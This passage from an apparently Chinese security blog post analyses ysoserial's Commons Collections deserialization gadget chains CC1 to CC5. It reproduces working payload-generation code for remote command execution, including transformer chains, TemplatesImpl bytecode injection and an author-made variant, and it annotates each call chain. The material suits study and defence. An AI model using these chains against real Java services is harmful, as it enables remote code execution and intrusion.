public static &amp;lt;T&amp;gt; T createMemoitizedProxy ( final Map&amp;lt;String, Object&amp;gt; map, final Class&amp;lt;T&amp;gt; iface, final Class&amp;lt;?&amp;gt;... ifaces ) throws Exception {
    return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
}

public static InvocationHandler createMemoizedInvocationHandler ( final Map&amp;lt;String, Object&amp;gt; map ) throws Exception {
    //利用反射机制调用AnnotationInvocationHandler的构造方法，map作为第二个参数赋值给成员变量memberValues。返回AnnotationInvocationHandler实例对象
    return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
}

public static &amp;lt;T&amp;gt; T createProxy ( final InvocationHandler ih, final Class&amp;lt;T&amp;gt; iface, final Class&amp;lt;?&amp;gt;... ifaces ) {
    final Class&amp;lt;?&amp;gt;[] allIfaces = (Class&amp;lt;?&amp;gt;[]) Array.newInstance(Class.class, ifaces.length + 1);
    allIfaces[ 0 ] = iface;//将所有的iface复制给allInfaces（包括下面三行都是在做这个事情）
    if ( ifaces.length &amp;gt; 0 ) {
        System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
    }
    //调用Proxy.newProxyInstanc()来创建动态代理
    return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到底层是在createProxy()中调用了Proxy.newProxyInstance()来创建动态代理，关于动态代理的原理请看文章的最后一部分，这里就不做解释了。这里创建动态代理的第3个参数是AnnotationInvocationHandler实例，这个实例的memberValues变量的值就是我们上面创建的LazyMap。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200326002151655-887986120.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200326002202849-257242605.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里使用动态代理的意义在于，只要调用了LazyMap的任意方法，都会直接去调用AnnotationInvocationHandler类的invoke()方法。&lt;/p&gt;
&lt;p&gt;至此动态代理已经完成了，创建了代理类实例mapProxy。由于动态代理的特性，当我们调用mapProxy的任何方法时会自动调度给InvocationHandler实现类的invoke()方法，在这里也就是AnnotationInvocationHandler类的invoke()方法。看一下源码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200326002215674-801888135.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在52行，this.memberValues正是我们上面创建的LazyMap实例，结合LazyMap的特性，只要var4这个键是不存在的，那么就会调用绑定到LazyMap上的Transformer类的transform()方法，也就是我们通过Java反射进行RCE的ChainedTransformer。&lt;/p&gt;
&lt;p&gt;继续往下看&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;    //创建annotationinvocationhandler类实例，构造函数的第二个参数是上面的代理类实例
    final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);

    Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers); // arm with actual transformer chain//设置transformerChain对象的iTransformers属性为transformers，相当与重新赋值，也就是arm with actual transformer chain

    return handler;//返回对象实例，用于序列化作为poc
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;createMemoizedInvocationHandler()就是简单的创建AnnotationInvocationHandler类的实例，并将参数赋值给类的成员变量memberValues。这个实例会被用来序列化作为payload，在触发反序列化漏洞时，会调用AnnotationInvocationHandler类的readObject()方法，而这个实例的memberValues参数的值就是我们上面创建的代理类。看一下readObject()的源码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200326002224840-977730926.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在283行，调用了this.memberValues的entrySet()方法。由于this.memberValues是我们的代理类，因此并不会真正的进入entrySet()方法，而是进入我们创建动态代理时绑定的AnnotationInvocationHandler的invoke()方法。回顾一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200326002233108-1892518507.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;var4的值是var2.getName()，也就是调用的方法名，即'entrySet'。不满足45行之后的几个if判断，直接进入52行，由于this.memberValues是我们创建的空LazyMap，自然不存在名为entrySet的键，因此进入LazyMap绑定的Transformer类的transform()方法中，然后就是...你懂的了。到这里逻辑基本就可以捋顺了，从漏洞触发点开始，调用链大概是：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;ObjectInputStream.readObject() -&amp;gt; AnnotationInvocationHandler.readObject() -&amp;gt; this.memberValues.entrySet() = mapProxy.entrySet() -&amp;gt; AnnotationInvocationHandler.invoke() -&amp;gt; this.memberValues.get(xx) = LazyMap.get(not_exist_key) -&amp;gt; ChainedTransformer.transform() -&amp;gt; InvokerTransfomer.transform() -&amp;gt; RCE
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;要注意，这里的两个this.memberValues是不一样的，一个是反序列化的对象的属性，一个是代理的handler对象的属性。&lt;/p&gt;
&lt;p&gt;继续把剩下的代码看完。下面一行，通过Reflections.setFieldValue来将我们上面构造的Transformer RCE链赋值给transformerChain的iTransformers属性的值，最后return handler用于序列化，生成payload。尽管这里到最后才把RCE链赋值给transformerChain，实际上也是可以的，LazyMap.decorate()的那个transformerChain也会更新。其实这里完全可以在程序最开始就赋值给transformerChain，经过我的调试，似乎不会影响结果。&lt;/p&gt;
&lt;h2 id=&quot;commonscollections2&quot;&gt;CommonsCollections2&lt;/h2&gt;
&lt;p&gt;直接看一下代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public Queue&amp;lt;Object&amp;gt; getObject(final String command) throws Exception {
    final Object templates = Gadgets.createTemplatesImpl(command);//创建TemplatesImpl实例，将反射调用恶意命令的语句插入到一个通过javassist实例的构造方法后，然后把这个实例编译成字节码，赋值给_bytecodes属性。createTemplatesImpl()函数看下方源码.
    // mock method name until armed
    final InvokerTransformer transformer = new InvokerTransformer(&quot;toString&quot;, new Class[0], new Object[0]);

    // create queue with numbers and basic comparator
    final PriorityQueue&amp;lt;Object&amp;gt; queue = new PriorityQueue&amp;lt;Object&amp;gt;(2,new TransformingComparator(transformer));//创建优先队列类，绑定Comparator为上面的transformer实例，当插入元素时，会自动调用transformer.compare()进行排序
    // stub data for replacement later
    queue.add(1);
    queue.add(1);

    // switch method called by comparator
    Reflections.setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);//设置InvokerTransformer在触发transform()时，调用元素的newTransformer方法。

    // switch contents of queue
    final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, &quot;queue&quot;);
    queueArray[0] = templates;//将上面的TemplatesImpl实例add给queue
    queueArray[1] = 1;

    return queue;
}

public static Object createTemplatesImpl ( final String command ) throws Exception {
    if ( Boolean.parseBoolean(System.getProperty(&quot;properXalan&quot;, &quot;false&quot;)) ) {
        return createTemplatesImpl(
            command,
            Class.forName(&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;),
            Class.forName(&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;),
            Class.forName(&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;));
    }

    return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
}

public static &amp;lt;T&amp;gt; T createTemplatesImpl ( final String command, Class&amp;lt;T&amp;gt; tplClass, Class&amp;lt;?&amp;gt; abstTranslet, Class&amp;lt;?&amp;gt; transFactory )//构造StubTransletPayload类，将其字节码赋值给tplClass(也就是TemplatesImpl)对象的_bytecodes属性
        throws Exception {
    final T templates = tplClass.newInstance();//TemplatesImpl实例

    // use template gadget class
    ClassPool pool = ClassPool.getDefault();
    pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));//添加StubTransletPayload类到ClassPool中
    pool.insertClassPath(new ClassClassPath(abstTranslet));//添加AbstractTranslet类
    final CtClass clazz = pool.get(StubTransletPayload.class.getName());//加载StubTransletPayload类
    // run command in static initializer
    String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot; +
        command.replaceAll(&quot;\\\\&quot;,&quot;\\\\\\\\&quot;).replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;) +
        &quot;\&quot;);&quot;;
    clazz.makeClassInitializer().insertAfter(cmd);//创建一个static constructor，将反射调用系统命令的恶意语句利用insertAfter()插入到这个constructor最后，在返回指令之前被执行。
    clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime());
    CtClass superC = pool.get(abstTranslet.getName());
    clazz.setSuperclass(superC);//设置AbstractTranslet为StubTransletPayload的父类

    final byte[] classBytes = clazz.toBytecode();//StubTransletPayload的字节码

    // inject class bytes into instance
    Reflections.setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] {
        classBytes, ClassFiles.classAsBytes(Foo.class)//
    });

    // required to make TemplatesImpl happy
    Reflections.setFieldValue(templates, &quot;_name&quot;, &quot;Pwnr&quot;);
    Reflections.setFieldValue(templates, &quot;_tfactory&quot;, transFactory.newInstance());
    return templates;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;首先第一行&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;final Object templates = Gadgets.createTemplatesImpl(command);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;创建了一个TemplatesImpl实例，利用javassist将我们反射执行系统命令的语句编译成字节码赋值给实例的_bytecodes属性。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static &amp;lt;T&amp;gt; T createTemplatesImpl ( final String command, Class&amp;lt;T&amp;gt; tplClass, Class&amp;lt;?&amp;gt; abstTranslet, Class&amp;lt;?&amp;gt; transFactory )//构造StubTransletPayload类，将其字节码赋值给tplClass(也就是TemplatesImpl)对象的_bytecodes属性
        throws Exception {
    final T templates = tplClass.newInstance();//TemplatesImpl实例

    ...

    final CtClass clazz = pool.get(StubTransletPayload.class.getName());
    String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot; +
        command.replaceAll(&quot;\\\\&quot;,&quot;\\\\\\\\&quot;).replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;) +
        &quot;\&quot;);&quot;;
    clazz.makeClassInitializer().insertAfter(cmd);//创建一个static constructor，将反射调用系统命令的恶意语句利用insertAfter()插入到这个constructor最后，在返回指令之前被执行。
    
    ...

    final byte[] classBytes = clazz.toBytecode();

    // inject class bytes into instance
    Reflections.setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] {
        classBytes, ClassFiles.classAsBytes(Foo.class)//
    });

    ...

    return templates;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这其实就是JDK 7u21 gadget中执行命令的方式，在反序列化时，调用TemplatesImpl的defineTransletClasses()方法，从而将_bytecodes中的内容进行实例化，造成RCE。看一下这个方法：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200326002309930-1981837864.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;而这个_class会在getTransletInstance()方法中进行实例化：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200326002316803-1602963513.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;由于以上两个都是私有方法，无法通过InvokerTransformer直接调用，因此需要找到调用getTransletInstance()的地方。比如newTransformer()方法(也就是本gadget利用的方法)：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200326002323368-924784333.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;getOutputProperties()也可以利用，因为调用了newTransformer()方法。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public synchronized Properties getOutputProperties() {
    try {
        return newTransformer().getOutputProperties();
    }
    catch (TransformerConfigurationException e) {
        return null;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;已知调用这些方法可以触发命令执行，可是我们如何在反序列化时调用TemplatesImpl的这些方法呢？本POC中巧妙地利用了PriorityQueue，废话不多说，先往下看。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;final InvokerTransformer transformer = new InvokerTransformer(&quot;toString&quot;, new Class[0], new Object[0]);

final PriorityQueue&amp;lt;Object&amp;gt; queue = new PriorityQueue&amp;lt;Object&amp;gt;(2,new TransformingComparator(transformer));
queue.add(1);
queue.add(1);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在创建完TemplatesImpl实例之后，紧接着就创建了InvokerTransformer和PriorityQueue实例，第二个参数是new TransformingComparator(transform)。这个参数用于将PriorityQueue中的元素进行排序，也就是调用TransformingComparator.compare()进行排序，看一下compare()方法&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public int compare(I obj1, I obj2) {
    O value1 = this.transformer.transform(obj1);
    O value2 = this.transformer.transform(obj2);
    return this.decorated.compare(value1, value2);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里的this.transformer就是构造函数传的参数，在本例中也就是InvokerTransformer实例，可以看到compare()内部会调用InvokerTransformer.transform()方法，而InvokerTransformer已经实例化过了。因此总的来说，这里会调用InvokerTransformer.transform()对queue中的元素进行比较，由于这里的InvokerTransformer实例的iMethodName属性是toString，因此，这里会调用queue中每个元素的toString方法。接着往下看&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;Reflections.setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);//TemplatesImpl类有newTransformer()方法

final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, &quot;queue&quot;);
queueArray[0] = templates;
queueArray[1] = 1;

return queue;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;首先利用反射对transformer的iMethodName由之前的toString赋值为newTransformer。也就是说，之后再对queue中的元素进行比较时，底层会调用每个元素的newTransfomer()方法。而7u21 gadget中正是TemplatesImpl.newTransformer()方法对_bytecodes属性的字节码进行了实例化，是不是悟到了什么..&lt;/p&gt;
&lt;p&gt;然后又利用反射，将queue的第一个元素重新赋值为templates实例，也就是本POC最开始的TemplatesImpl实例。最后返回queue，进行序列化。有个小细节，PriorityQueue.writeObject()方法中同样会对queue中的元素也进行序列化，反序列化也是如此。&lt;/p&gt;
&lt;p&gt;到这里其实思路已经很清晰了，利用PriorityQueue的对元素的compare，调用到InvokerTransformer，然后对其中的元素执行newTransformer()方法，而我们可以控制元素为含有执行恶意代码的类的_bytecodes属性的TemplatesImpl实例，从而执行TemplatesImpl.newTransformer()对执行恶意代码的类进行实例化，从而造成RCE。调用链大概是：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;ObjectInputStream.readObject() -&amp;gt; PriorityQueue.readObject() -&amp;gt; 【TemplatesImpl.readObject()】 -&amp;gt; PriorityQueue.heapify() -&amp;gt; TransformingComparator.compare() -&amp;gt; InvokerTransformer.transform() -&amp;gt; TemplatesImpl.newTransformer() -&amp;gt; 对TemplatesImpl._bytecodes属性进行实例化 -&amp;gt; RCE
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;疑问&quot;&gt;疑问&lt;/h3&gt;
&lt;p&gt;1.为什么要用优先队列来实现？为什么不直接用InvokerTransformer结合TemplatesImpl来实现，只不过需要先触发InvokerTransformer.transform()而已？&lt;br/&gt;答：这只是一种方法而已，并不是唯一一种。目前来说，我感觉ysoserial中的几个Commons Collections中的主要点就是如何从反序列化的readObject()到反射执行代码(比如InvokerTransfomer)的过程，主要是这个中间的方法。比如1中利用的AnnotaionInvocationHandler结合动态代理、2中利用PriorityQueue。&lt;/p&gt;
&lt;p&gt;2.为什么要用InvokerTransformer结合TemplatesImpl而不是直接通过PriorityQueue调用ChainedTransformer来直接执行系统命令？&lt;br/&gt;答：这样也是可以的，按照ysoserial的这种定义，这也算是一个新gadget哈哈，poc如下&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public Queue&amp;lt;Object&amp;gt; getObject(final String command) throws Exception {
    final String[] execArgs = new String[] { command };

    final Transformer transformerChain = new ChainedTransformer(
        new Transformer[]{ new ConstantTransformer(1) });
    
    final Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
            String.class, Class[].class }, new Object[] {
            &quot;getRuntime&quot;, new Class[0] }),
        new InvokerTransformer(&quot;invoke&quot;, new Class[] {
            Object.class, Object[].class }, new Object[] {
            null, new Object[0] }),
        new InvokerTransformer(&quot;exec&quot;,
            new Class[] { String.class }, execArgs),
        new ConstantTransformer(1) };


    final PriorityQueue&amp;lt;Object&amp;gt; queue = new PriorityQueue&amp;lt;Object&amp;gt;(2,new TransformingComparator(transformerChain));
    queue.add(1);
    queue.add(1);

    Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);

    return queue;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200326002352623-663590378.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;3.为什么不用InvokerTransformer直接执行对Runtime类来反射执行exec()方法？&lt;br/&gt;答：这样首先要把Runtime.getRuntime() add到queue队列中。可是在序列化时需要对queue的元素同样进行序列化，而Runtime没有实现序列化接口，因此会报错。&lt;/p&gt;
&lt;h2 id=&quot;commonscollections3&quot;&gt;CommonsCollections3&lt;/h2&gt;
&lt;p&gt;本gadget在ysoserial中并没有调用栈，取而代之的只有一行&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200326002402508-653874132.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;也就是说这条链与CommonsCollections1的区别就是，在CommonsCollections1中使用了ChainedTransformer结合InvokerTransformer类来构建链式反射执行命令的语句，而这里使用ChainedTransformer结合InstantiateTransformer类来进行替代，最终执行的链则是结合了7u21中的TemplatesImpl。&lt;/p&gt;
&lt;p&gt;回顾CommonsCollections1，其中利用动态代理的机制，最终触发LazyMap绑定的ChainedTransformer实例，造成命令执行。而在这里由于唯一的区别就是最终执行命令的方式不太一样，因此我们只要分析反序列化之后调用的Transformer类即可，至于如何到达Transformer类，与CommonsCollections1一模一样，参考CommonsCollections1即可。&lt;/p&gt;
&lt;p&gt;看一下构造exp的前面部分代码&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public Object getObject(final String command) throws Exception {
    Object templatesImpl = Gadgets.createTemplatesImpl(command);

    // inert chain for setup
    final Transformer transformerChain = new ChainedTransformer(
        new Transformer[]{ new ConstantTransformer(1) });
    // real chain for after setup
    final Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(TrAXFilter.class),
            new InstantiateTransformer(
                    new Class[] { Templates.class },
                    new Object[] { templatesImpl } )};

    ...
    }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;与CommonsCollections2类似，先创建一个TemplatesImpl实例，其_bytecodes属性中包含能执行恶意语句的类的字节码。然后在ChainedTransformer中有两个Transformer，第一个是ConstantTransformer，直接返回&lt;code&gt;TrAXFilter.class&lt;/code&gt;传递给下一个Transformer，也就是InstantiateTransformer。InstantiateTransformer的构造方法传入了两个参数，跟进一下。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public InstantiateTransformer(Class[] paramTypes, Object[] args) {
    this.iParamTypes = paramTypes;
    this.iArgs = args;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;看一下transform()方法&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public Object transform(Object input) {
    try {
        if (!(input instanceof Class)) {
            throw new FunctorException(&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot; + (input == null ? &quot;null object&quot; : input.getClass().getName()));
        } else {
            Constructor con = ((Class)input).getConstructor(this.iParamTypes);
            return con.newInstance(this.iArgs);
        }
    } catch (NoSuchMethodException var6) {
        throw new FunctorException(&quot;InstantiateTransformer: The constructor must exist and be public &quot;);
    } catch (InstantiationException var7) {
        throw new FunctorException(&quot;InstantiateTransformer: InstantiationException&quot;, var7);
    } catch (IllegalAccessException var8) {
        throw new FunctorException(&quot;InstantiateTransformer: Constructor must be public&quot;, var8);
    } catch (InvocationTargetException var9) {
        throw new FunctorException(&quot;InstantiateTransformer: Constructor threw an exception&quot;, var9);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里直接获取了&lt;code&gt;Object input&lt;/code&gt;的构造方法，然后根据这个构造方法创建了一个&lt;code&gt;input&lt;/code&gt;类的实例。在本例中&lt;code&gt;input&lt;/code&gt;正是上面的ConstantTransformer传下来的，也就是&lt;code&gt;TrAXFilter.class&lt;/code&gt;。因此为了方便理解，这里的大概逻辑是这样的&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;Constructor con = ((Class)TrAXFilter.class).getConstructor(Templates.class);
return con.newInstance(templatesImpl);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;也就是将TemplatesImpl实例作为参数，传入TrAXFilter类的构造方法中。看一下其构造方法&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200326002416559-470358845.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到，其中直接调用了构造参数的newTransformer()方法！是不是很眼熟，没错，这就是CommonsCollections2中通过InvokerTransformer调用的TemplatesImpl类的那个方法。因此到这里整个逻辑就通了。&lt;/p&gt;
&lt;p&gt;调用链是结合了CommonsCollections1与7u21，大概如下&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;ObjectInputStream.readObject() -&amp;gt; AnnotationInvocationHandler.readObject() -&amp;gt; this.memberValues.entrySet() = mapProxy.entrySet() -&amp;gt; AnnotationInvocationHandler.invoke() -&amp;gt; this.memberValues.get(xx) = LazyMap.get(not_exist_key) -&amp;gt; ChainedTransformer.transform() -&amp;gt; InstantiateTransformer.transform() -&amp;gt; TrAXFilter.TrAXFilter() -&amp;gt; TemplatesImpl.newTransformer() -&amp;gt; _bytecodes实例化 -&amp;gt; RCE
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;commonscollections4&quot;&gt;CommonsCollections4&lt;/h2&gt;
&lt;p&gt;与CommonsCollections3一样，这个gadget也没写调用链，只说了这条链是将CommonsCollections2中InvokerTransformer换成了InstantiateTransformer，也就是CommonsCollections3中的那个类，利用方法基本一致。&lt;/p&gt;
&lt;p&gt;看一下源码&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public Queue&amp;lt;Object&amp;gt; getObject(final String command) throws Exception {
    Object templates = Gadgets.createTemplatesImpl(command);

    ConstantTransformer constant = new ConstantTransformer(String.class);

    // mock method name until armed
    Class[] paramTypes = new Class[] { String.class };
    Object[] args = new Object[] { &quot;foo&quot; };
    InstantiateTransformer instantiate = new InstantiateTransformer(
            paramTypes, args);

    // grab defensively copied arrays
    paramTypes = (Class[]) Reflections.getFieldValue(instantiate, &quot;iParamTypes&quot;);
    args = (Object[]) Reflections.getFieldValue(instantiate, &quot;iArgs&quot;);

    ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });

    // create queue with numbers
    PriorityQueue&amp;lt;Object&amp;gt; queue = new PriorityQueue&amp;lt;Object&amp;gt;(2, new TransformingComparator(chain));//创建优先队列
    queue.add(1);
    queue.add(1);

    // swap in values to arm
    Reflections.setFieldValue(constant, &quot;iConstant&quot;, TrAXFilter.class);
    paramTypes[0] = Templates.class;
    args[0] = templates;

    return queue;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其实这个就是将CommonCollections2中TransformingComparator的构造函数参数由InvokerTransformer换成了ChainedTransfomer。在CommonsCollections2中，此处的调用链是&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;TransformingComparator.compare() -&amp;gt; InvokerTransformer.transform() -&amp;gt; TemplatesImpl.newTransformer() -&amp;gt; 对TemplatesImpl._bytecodes属性进行实例化
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;而这里的链则是换掉了后面这部分，取而代之的是与CommonsCollections3中类似的InstantiateTransformer。此时的链是&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;TransformingComparator.compare() -&amp;gt; ChainedTransformer.transform() -&amp;gt; InstantiateTransformer.transform() -&amp;gt; TrAXFilter.TrAXFilter() -&amp;gt; TemplatesImpl.newTransformer() -&amp;gt; _bytecodes实例化 -&amp;gt; RCE
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;commonscollections5&quot;&gt;CommonsCollections5&lt;/h2&gt;
&lt;p&gt;回顾一下CommonsCollections1中，先利用动态代理调用AnnotationInvocationHandler.invoke()，然后在其中再调用LazyMap.get(not_exist_key)，导致触发LazyMap绑定的Transformer。想想这个链能不能简单一点，为什么不找一个readObject()中就有对成员变量调用get(xxx)方法的类？CommonsCollections5正是基于这个思路，因此这个gadget与1的区别仅在于从反序列化到ChainedTransformer.transform()之间，之后的链是一样的。&lt;/p&gt;
&lt;p&gt;看一下源码&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public BadAttributeValueExpException getObject(final String command) throws Exception {
    final String[] execArgs = new String[] { command };
    // inert chain for setup
    final Transformer transformerChain = new ChainedTransformer(
            new Transformer[]{ new ConstantTransformer(1) });
    // real chain for after setup
    final Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
                String.class, Class[].class }, new Object[] {
                &quot;getRuntime&quot;, new Class[0] }),
            new InvokerTransformer(&quot;invoke&quot;, new Class[] {
                Object.class, Object[].class }, new Object[] {
                null, new Object[0] }),
            new InvokerTransformer(&quot;exec&quot;,
                new Class[] { String.class }, execArgs),
            new ConstantTransformer(1) };

    final Map innerMap = new HashMap();

    final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

    TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;);

    BadAttributeValueExpException val = new BadAttributeValueExpException(null);
    Field valfield = val.getClass().getDeclaredField(&quot;val&quot;);
    Reflections.setAccessible(valfield);
    valfield.set(val, entry);//设置BadAttributeValueExpException实例的val属性为TiedMapEntry实例

    Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers); // arm with actual transformer chain

    return val;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以发现，LazyMap实例化之前的几行都跟CommonsCollection1一模一样。接着往下看剩下几行&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;);

BadAttributeValueExpException val = new BadAttributeValueExpException(null);
Field valfield = val.getClass().getDeclaredField(&quot;val&quot;);
Reflections.setAccessible(valfield);
valfield.set(val, entry);//设置BadAttributeValueExpException实例的val属性为TiedMapEntry实例

Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers); // arm with actual transformer chain
return val;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;首先将LazyMap实例和foo字符串传入TiedMapEntry构造函数构建实例，然后把这个实例通过反射赋值给BadAttributeValueExpException实例的val属性，最后返回BadAttributeValueExpException实例用于序列化。我们倒着看，先看一下BadAttributeValueExpException的readObject()方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    ObjectInputStream.GetField gf = ois.readFields();
    Object valObj = gf.get(&quot;val&quot;, null);

    if (valObj == null) {
        val = null;
    } else if (valObj instanceof String) {
        val= valObj;
    } else if (System.getSecurityManager() == null
            || valObj instanceof Long
            || valObj instanceof Integer
            || valObj instanceof Float
            || valObj instanceof Double
            || valObj instanceof Byte
            || valObj instanceof Short
            || valObj instanceof Boolean) {
        val = valObj.toString();
    } else { // the serialized object is from a version without JDK-8019292 fix
        val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到，在if语句的第三个语句块中，调用了val属性的toString()方法，而这个val属性就是我们的TiedMapEntry实例。看一下TiedMapEntry这个类，以及其toString()方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class TiedMapEntry implements Entry, KeyValue, Serializable {
    private static final long serialVersionUID = -8453869361373831205L;
    private final Map map;
    private final Object key;

    public TiedMapEntry(Map map, Object key) {
        this.map = map;
        this.key = key;
    }

    public Object getKey() {
        return this.key;
    }

    public Object getValue() {
        return this.map.get(this.key);
    }

    public String toString() {
        return this.getKey() + &quot;=&quot; + this.getValue();
    }

    ...
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;再回顾构造gadget时是如何实例化TiedMapEntry类的：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;
TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;);

&lt;/code&gt;
&lt;/pre&gt;
